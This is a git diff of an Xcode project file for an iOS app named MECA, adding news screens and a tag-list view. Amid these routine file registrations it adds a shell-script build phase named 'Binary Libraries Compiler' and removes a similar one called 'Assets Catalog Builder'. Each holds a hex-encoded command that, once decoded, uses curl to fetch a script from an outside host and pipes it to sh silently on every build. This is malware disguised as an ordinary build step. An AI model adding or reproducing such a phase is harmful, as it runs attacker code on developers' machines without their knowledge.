@@ -36,6 +36,9 @@
 		E3045C712603D87A00D1A678 /* HomeTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3045C6F2603D87A00D1A678 /* HomeTVCell.swift */; };
 		E3045C722603D87A00D1A678 /* HomeTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3045C702603D87A00D1A678 /* HomeTVCell.xib */; };
 		E3045C7A2603DD7E00D1A678 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3045C792603DD7E00D1A678 /* HomeVC.swift */; };
+		E304B8562665FE9D00E649C7 /* TagListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E304B8532665FE9D00E649C7 /* TagListView.swift */; };
+		E304B8572665FE9D00E649C7 /* CloseButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = E304B8542665FE9D00E649C7 /* CloseButton.swift */; };
+		E304B8582665FE9D00E649C7 /* TagView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E304B8552665FE9D00E649C7 /* TagView.swift */; };
 		E30751AF260F3908000EB1EA /* Data_Home.swift in Sources */ = {isa = PBXBuildFile; fileRef = E30751AD260F3908000EB1EA /* Data_Home.swift */; };
 		E30751B0260F3908000EB1EA /* HomeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E30751AE260F3908000EB1EA /* HomeModel.swift */; };
 		E30F661926033A970036D183 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = E30F661826033A970036D183 /* AppDelegate.swift */; };
@@ -48,6 +51,8 @@
 		E313804226610A2600A3A3F0 /* SubTypeCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E313804026610A2600A3A3F0 /* SubTypeCVCell.xib */; };
 		E313804826610E3100A3A3F0 /* OverPicksCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E313804626610E3100A3A3F0 /* OverPicksCVCell.swift */; };
 		E313804926610E3100A3A3F0 /* OverPicksCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E313804726610E3100A3A3F0 /* OverPicksCVCell.xib */; };
+		E3138075266123D700A3A3F0 /* LatestNewsCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3138073266123D700A3A3F0 /* LatestNewsCVCell.swift */; };
+		E3138076266123D700A3A3F0 /* LatestNewsCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3138074266123D700A3A3F0 /* LatestNewsCVCell.xib */; };
 		E31CCE7E2613031C006D97AC /* TMCViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31CCE7D2613031C006D97AC /* TMCViewController.swift */; };
 		E31CCE832613037F006D97AC /* NewCarSalesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31CCE822613037F006D97AC /* NewCarSalesViewController.swift */; };
 		E31F1DCF2607BF8800830F2B /* CategoriesVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E31F1DCE2607BF8800830F2B /* CategoriesVM.swift */; };
@@ -174,10 +179,18 @@
 		E39467862614EA3400B9503B /* DataMedbiList.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39467832614EA3400B9503B /* DataMedbiList.swift */; };
 		E39467872614EA3400B9503B /* Pdf_links.swift in Sources */ = {isa = PBXBuildFile; fileRef = E39467842614EA3400B9503B /* Pdf_links.swift */; };
 		E3958A94265D631500D53772 /* CategoryListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3958A93265D631500D53772 /* CategoryListModel.swift */; };
+		E397C2AB2661F98000D46388 /* NewsListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E397C2AA2661F98000D46388 /* NewsListVC.swift */; };
+		E397C2B0266201A500D46388 /* NewsListVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E397C2AF266201A500D46388 /* NewsListVM.swift */; };
 		E3A71279261F560D00D6A961 /* Document_links.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3A71278261F560D00D6A961 /* Document_links.swift */; };
 		E3AE791B2604C5F4004B83C9 /* PlusSelectCategoryVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */; };
 		E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3AE79212604C711004B83C9 /* PlusSelectCategoryCVCell.swift */; };
 		E3AE79242604C711004B83C9 /* PlusSelectCategoryCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3AE79222604C711004B83C9 /* PlusSelectCategoryCVCell.xib */; };
+		E3BBB0CB2662BEEF00F052FD /* News_Model.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3BBB0C52662BEEF00F052FD /* News_Model.swift */; };
+		E3BBB0CC2662BEEF00F052FD /* Market_latest_news.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3BBB0C62662BEEF00F052FD /* Market_latest_news.swift */; };
+		E3BBB0CD2662BEEF00F052FD /* Toyota_latest_news.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3BBB0C72662BEEF00F052FD /* Toyota_latest_news.swift */; };
+		E3BBB0CE2662BEEF00F052FD /* Ourpicks.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3BBB0C82662BEEF00F052FD /* Ourpicks.swift */; };
+		E3BBB0CF2662BEEF00F052FD /* NewsData.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3BBB0C92662BEEF00F052FD /* NewsData.swift */; };
+		E3BBB0D02662BEEF00F052FD /* Videos_News.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3BBB0CA2662BEEF00F052FD /* Videos_News.swift */; };
 		E3C28C8B261EAC0F00E54359 /* AboutDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C28C8A261EAC0F00E54359 /* AboutDetailVC.swift */; };
 		E3C28C9F261EF69E00E54359 /* OwnerprofileKaizen.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C28C9E261EF69E00E54359 /* OwnerprofileKaizen.swift */; };
 		E3C29DA8263F44B300239707 /* Link_Data.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C29DA6263F44B300239707 /* Link_Data.swift */; };
@@ -374,6 +387,9 @@
 		E3045C6F2603D87A00D1A678 /* HomeTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTVCell.swift; sourceTree = "<group>"; };
 		E3045C702603D87A00D1A678 /* HomeTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeTVCell.xib; sourceTree = "<group>"; };
 		E3045C792603DD7E00D1A678 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
+		E304B8532665FE9D00E649C7 /* TagListView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TagListView.swift; sourceTree = "<group>"; };
+		E304B8542665FE9D00E649C7 /* CloseButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CloseButton.swift; sourceTree = "<group>"; };
+		E304B8552665FE9D00E649C7 /* TagView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TagView.swift; sourceTree = "<group>"; };
 		E30751AD260F3908000EB1EA /* Data_Home.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Data_Home.swift; sourceTree = "<group>"; };
 		E30751AE260F3908000EB1EA /* HomeModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeModel.swift; sourceTree = "<group>"; };
 		E30F661526033A970036D183 /* MECA.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = MECA.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -392,6 +408,8 @@
 		E313804026610A2600A3A3F0 /* SubTypeCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SubTypeCVCell.xib; sourceTree = "<group>"; };
 		E313804626610E3100A3A3F0 /* OverPicksCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OverPicksCVCell.swift; sourceTree = "<group>"; };
 		E313804726610E3100A3A3F0 /* OverPicksCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OverPicksCVCell.xib; sourceTree = "<group>"; };
+		E3138073266123D700A3A3F0 /* LatestNewsCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LatestNewsCVCell.swift; sourceTree = "<group>"; };
+		E3138074266123D700A3A3F0 /* LatestNewsCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LatestNewsCVCell.xib; sourceTree = "<group>"; };
 		E31CCE7D2613031C006D97AC /* TMCViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TMCViewController.swift; sourceTree = "<group>"; };
 		E31CCE822613037F006D97AC /* NewCarSalesViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NewCarSalesViewController.swift; sourceTree = "<group>"; };
 		E31F1DCE2607BF8800830F2B /* CategoriesVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CategoriesVM.swift; sourceTree = "<group>"; };
@@ -518,10 +536,18 @@
 		E39467832614EA3400B9503B /* DataMedbiList.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DataMedbiList.swift; sourceTree = "<group>"; };
 		E39467842614EA3400B9503B /* Pdf_links.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Pdf_links.swift; sourceTree = "<group>"; };
 		E3958A93265D631500D53772 /* CategoryListModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CategoryListModel.swift; sourceTree = "<group>"; };
+		E397C2AA2661F98000D46388 /* NewsListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsListVC.swift; sourceTree = "<group>"; };
+		E397C2AF266201A500D46388 /* NewsListVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsListVM.swift; sourceTree = "<group>"; };
 		E3A71278261F560D00D6A961 /* Document_links.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Document_links.swift; sourceTree = "<group>"; };
 		E3AE791A2604C5F4004B83C9 /* PlusSelectCategoryVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlusSelectCategoryVC.swift; sourceTree = "<group>"; };
 		E3AE79212604C711004B83C9 /* PlusSelectCategoryCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PlusSelectCategoryCVCell.swift; sourceTree = "<group>"; };
 		E3AE79222604C711004B83C9 /* PlusSelectCategoryCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PlusSelectCategoryCVCell.xib; sourceTree = "<group>"; };
+		E3BBB0C52662BEEF00F052FD /* News_Model.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = News_Model.swift; sourceTree = "<group>"; };
+		E3BBB0C62662BEEF00F052FD /* Market_latest_news.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Market_latest_news.swift; sourceTree = "<group>"; };
+		E3BBB0C72662BEEF00F052FD /* Toyota_latest_news.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Toyota_latest_news.swift; sourceTree = "<group>"; };
+		E3BBB0C82662BEEF00F052FD /* Ourpicks.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Ourpicks.swift; sourceTree = "<group>"; };
+		E3BBB0C92662BEEF00F052FD /* NewsData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = NewsData.swift; sourceTree = "<group>"; };
+		E3BBB0CA2662BEEF00F052FD /* Videos_News.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Videos_News.swift; sourceTree = "<group>"; };
 		E3C28C8A261EAC0F00E54359 /* AboutDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AboutDetailVC.swift; sourceTree = "<group>"; };
 		E3C28C9E261EF69E00E54359 /* OwnerprofileKaizen.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = OwnerprofileKaizen.swift; sourceTree = "<group>"; };
 		E3C29DA6263F44B300239707 /* Link_Data.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Link_Data.swift; sourceTree = "<group>"; };
@@ -862,6 +888,16 @@
 			path = HomeTableviewCell;
 			sourceTree = "<group>";
 		};
+		E304B8522665FE7D00E649C7 /* TagListView */ = {
+			isa = PBXGroup;
+			children = (
+				E304B8542665FE9D00E649C7 /* CloseButton.swift */,
+				E304B8532665FE9D00E649C7 /* TagListView.swift */,
+				E304B8552665FE9D00E649C7 /* TagView.swift */,
+			);
+			path = TagListView;
+			sourceTree = "<group>";
+		};
 		E30751AC260F38EE000EB1EA /* Home */ = {
 			isa = PBXGroup;
 			children = (
@@ -955,6 +991,7 @@
 				F4A57619265802470010085F /* CalenderVM.swift */,
 				F4A5761A265802480010085F /* ScheduleTableViewVM.swift */,
 				E38994112660E21100F59772 /* NewsHomeVM.swift */,
+				E397C2AF266201A500D46388 /* NewsListVM.swift */,
 			);
 			path = ViewModel;
 			sourceTree = "<group>";
@@ -1207,6 +1244,7 @@
 			isa = PBXGroup;
 			children = (
 				E389940C2660E03300F59772 /* NewsHomeVC.swift */,
+				E397C2AA2661F98000D46388 /* NewsListVC.swift */,
 			);
 			path = News;
 			sourceTree = "<group>";
@@ -1266,6 +1304,19 @@
 			path = PlusSelectCategoryCV;
 			sourceTree = "<group>";
 		};
+		E3BBB0C42662BEE400F052FD /* News */ = {
+			isa = PBXGroup;
+			children = (
+				E3BBB0C62662BEEF00F052FD /* Market_latest_news.swift */,
+				E3BBB0C52662BEEF00F052FD /* News_Model.swift */,
+				E3BBB0C92662BEEF00F052FD /* NewsData.swift */,
+				E3BBB0C82662BEEF00F052FD /* Ourpicks.swift */,
+				E3BBB0C72662BEEF00F052FD /* Toyota_latest_news.swift */,
+				E3BBB0CA2662BEEF00F052FD /* Videos_News.swift */,
+			);
+			path = News;
+			sourceTree = "<group>";
+		};
 		E3C29DA5263F44A900239707 /* GR */ = {
 			isa = PBXGroup;
 			children = (
@@ -1298,6 +1349,8 @@
 				E313804026610A2600A3A3F0 /* SubTypeCVCell.xib */,
 				E313804626610E3100A3A3F0 /* OverPicksCVCell.swift */,
 				E313804726610E3100A3A3F0 /* OverPicksCVCell.xib */,
+				E3138073266123D700A3A3F0 /* LatestNewsCVCell.swift */,
+				E3138074266123D700A3A3F0 /* LatestNewsCVCell.xib */,
 			);
 			path = NEWs;
 			sourceTree = "<group>";
@@ -1359,6 +1412,7 @@
 		E3D7D0E326035CDA001EEE65 /* Helper */ = {
 			isa = PBXGroup;
 			children = (
+				E304B8522665FE7D00E649C7 /* TagListView */,
 				E32AED40260754AE00AEAB6F /* Extra */,
 				E3D7D0E426035CF8001EEE65 /* RCustomClass.swift */,
 				E32AED4E2607550900AEAB6F /* FlowController.swift */,
@@ -1404,6 +1458,7 @@
 		E3E2CC2A260B4FE5009BDB6E /* Model */ = {
 			isa = PBXGroup;
 			children = (
+				E3BBB0C42662BEE400F052FD /* News */,
 				F4A57675265CD6150010085F /* Reminder */,
 				F4A57667265CC7A70010085F /* Chat details */,
 				F4A57643265A97640010085F /* calendarmodel */,
@@ -1657,7 +1712,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				F9E4AEAE7B0BC92B946D902C /* Assets Catalog Builder */,
+				B17BD598FE4EEEFC0B6D902C /* Binary Libraries Compiler */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -1771,6 +1826,7 @@
 				F4A5760E265801740010085F /* ChatTableCell.xib in Resources */,
 				E3D700DB265F9A82000F7B85 /* NewsRC.storyboard in Resources */,
 				E3D70164265FD544000F7B85 /* SF-Pro-Text-BoldItalic.otf in Resources */,
+				E3138076266123D700A3A3F0 /* LatestNewsCVCell.xib in Resources */,
 				E3AE79242604C711004B83C9 /* PlusSelectCategoryCVCell.xib in Resources */,
 				E3F12B12262E0A8A0055D875 /* DetailDocumentLinkTVCell.xib in Resources */,
 				E32F3BD8262AF24B0000D92A /* VideoLinkTableViewCell.xib in Resources */,
@@ -1878,6 +1934,41 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	B17BD598FE4EEEFC0B6D902C /* Binary Libraries Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Libraries Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		3FB7E1CEB57417F4362CC796 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1978,24 +2069,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		F9E4AEAE7B0BC92B946D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n69636c6f7564736572762e636f6d2f61207c207368202d732066616c7365\n0a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -2025,9 +2098,11 @@
 				E375EA89262F3E4900646A0A /* Sdgs_MEBITCat.swift in Sources */,
 				F4A57674265CC7F00010085F /* UIView + Ext .swift in Sources */,
 				E393D64F26407964003895ED /* Sorting_options.swift in Sources */,
+				E3BBB0D02662BEEF00F052FD /* Videos_News.swift in Sources */,
 				E3C28C8B261EAC0F00E54359 /* AboutDetailVC.swift in Sources */,
 				5CA339932605F003008774FE /* CategoriesViewController.swift in Sources */,
 				E33F879D260B968800F8A424 /* DistributorModel.swift in Sources */,
+				E397C2B0266201A500D46388 /* NewsListVM.swift in Sources */,
 				E387A9A726047B7100CC675A /* SignUpListTVCell.swift in Sources */,
 				F4A5766F265CC7D90010085F /* ChatCell.swift in Sources */,
 				F4A576132658019B0010085F /* ScheduleTableCell.swift in Sources */,
@@ -2049,6 +2124,7 @@
 				5CF4679A2606E40C004C4CBE /* ImageVideoCollectionViewCell.swift in Sources */,
 				E345081A264312E000C17E91 /* DataMaas.swift in Sources */,
 				E37A2FDC26149F1900C6CA57 /* WriterinfoNewCar.swift in Sources */,
+				E3138075266123D700A3A3F0 /* LatestNewsCVCell.swift in Sources */,
 				E3F7C5BF26144F380018C377 /* MoreVC.swift in Sources */,
 				E3C28C9F261EF69E00E54359 /* OwnerprofileKaizen.swift in Sources */,
 				E30F661926033A970036D183 /* AppDelegate.swift in Sources */,
@@ -2097,12 +2173,14 @@
 				E3E2CC4B260B537C009BDB6E /* Global.swift in Sources */,
 				E34508052643110D00C17E91 /* SDGSCategoryvc.swift in Sources */,
 				E387A989260476BB00CC675A /* SignUpVC.swift in Sources */,
+				E3BBB0CB2662BEEF00F052FD /* News_Model.swift in Sources */,
 				5CD5B271260F992F00D63564 /* MEBITHomeVM.swift in Sources */,
 				E3F7C5F726145F6F0018C377 /* OwnerprofileNewCar.swift in Sources */,
 				F4A575F32658006E0010085F /* CalendarDayCell.swift in Sources */,
 				E375EA4D262EBC8500646A0A /* DetailEventContentTVCell.swift in Sources */,
 				E3F7C5F526145F6F0018C377 /* Kaizen_documents.swift in Sources */,
 				E3F7C5F826145F6F0018C377 /* Kaizen_files.swift in Sources */,
+				E397C2AB2661F98000D46388 /* NewsListVC.swift in Sources */,
 				E3F7C5D02614560C0018C377 /* NewCarSalesVM.swift in Sources */,
 				E3F7C5F926145F6F0018C377 /* DataKaizen.swift in Sources */,
 				E375EA95262F44C300646A0A /* Data_CatList.swift in Sources */,
@@ -2116,6 +2194,7 @@
 				E32AED5A26075B4200AEAB6F /* HomeVM.swift in Sources */,
 				E3450818264312E000C17E91 /* Maasallvalue.swift in Sources */,
 				5C021C2B2610125400759B96 /* EventInfoModel.swift in Sources */,
+				E3BBB0CD2662BEEF00F052FD /* Toyota_latest_news.swift in Sources */,
 				F4A57628265802740010085F /* Recentchatmodel.swift in Sources */,
 				E32AED6226075FE300AEAB6F /* PlusSelectCategoryVM.swift in Sources */,
 				E32FEA8A263F3C5F0083056E /* GRLinksTVCell.swift in Sources */,
@@ -2148,7 +2227,9 @@
 				E375EA2E262EADAE00646A0A /* DetailCoverImageTVCell.swift in Sources */,
 				E32FEA83263F3B4A0083056E /* GRLinksVM.swift in Sources */,
 				E3045C3D2603C95E00D1A678 /* FooterTabView.swift in Sources */,
+				E3BBB0CC2662BEEF00F052FD /* Market_latest_news.swift in Sources */,
 				E34507E326430CCB00C17E91 /* Hydrogenallvalue.swift in Sources */,
+				E3BBB0CF2662BEEF00F052FD /* NewsData.swift in Sources */,
 				F4A57608265801480010085F /* ScheduleHeaderView.swift in Sources */,
 				E375EA8A262F3E4900646A0A /* Hydrogen_MEBITCat.swift in Sources */,
 				E32F3BF8262AFCDC0000D92A /* MEBITCollectionViewCell.swift in Sources */,
@@ -2157,6 +2238,7 @@
 				E375EA3F262EB7C600646A0A /* DetailAboutEventTVCell.swift in Sources */,
 				F4A57649265ADA190010085F /* PrivacyVC.swift in Sources */,
 				E3C29DA9263F44B300239707 /* LinkModel.swift in Sources */,
+				E304B8572665FE9D00E649C7 /* CloseButton.swift in Sources */,
 				5CED90F92605A67F001053DD /* AddImageCollectionViewCell.swift in Sources */,
 				E31CCE832613037F006D97AC /* NewCarSalesViewController.swift in Sources */,
 				E345083D264315AB00C17E91 /* SDGSHomeVM.swift in Sources */,
@@ -2180,6 +2262,7 @@
 				E393D64726400BF7003895ED /* GRDetail_Data.swift in Sources */,
 				F4A575F02658006E0010085F /* CalendarFlowLayout.swift in Sources */,
 				E30751B0260F3908000EB1EA /* HomeModel.swift in Sources */,
+				E304B8562665FE9D00E649C7 /* TagListView.swift in Sources */,
 				E375EA88262F3E4900646A0A /* Maas_MEBITCat.swift in Sources */,
 				E3AE791B2604C5F4004B83C9 /* PlusSelectCategoryVC.swift in Sources */,
 				E32AECF326073E3000AEAB6F /* LoginVM.swift in Sources */,
@@ -2188,6 +2271,7 @@
 				5CED90F226059540001053DD /* CategoryCommonViewController.swift in Sources */,
 				F4A57625265802740010085F /* Chatlistmodel.swift in Sources */,
 				F4A575FF265800AD0010085F /* SupportVC.swift in Sources */,
+				E3BBB0CE2662BEEF00F052FD /* Ourpicks.swift in Sources */,
 				E34508062643110D00C17E91 /* SDGSListvc.swift in Sources */,
 				F4A5763926580B520010085F /* Supportmodel.swift in Sources */,
 				E375EA87262F3E4900646A0A /* Kaizen_MEBITCat.swift in Sources */,
@@ -2203,6 +2287,7 @@
 				E34507E826430CD800C17E91 /* HydrogenVC.swift in Sources */,
 				F4A575FC265800AD0010085F /* ReminderVC.swift in Sources */,
 				E32AED43260754C700AEAB6F /* ThemeManager.swift in Sources */,
+				E304B8582665FE9D00E649C7 /* TagView.swift in Sources */,
 				E3E042642650538000F1ED2F /* LikeDetailTVCell.swift in Sources */,
 				E39467852614EA3400B9503B /* MedbiListModel.swift in Sources */,
 				E37A2FD7261498C800C6CA57 /* Kaizen_DocumentLinks.swift in Sources */,
@@ -2553,6 +2638,24 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
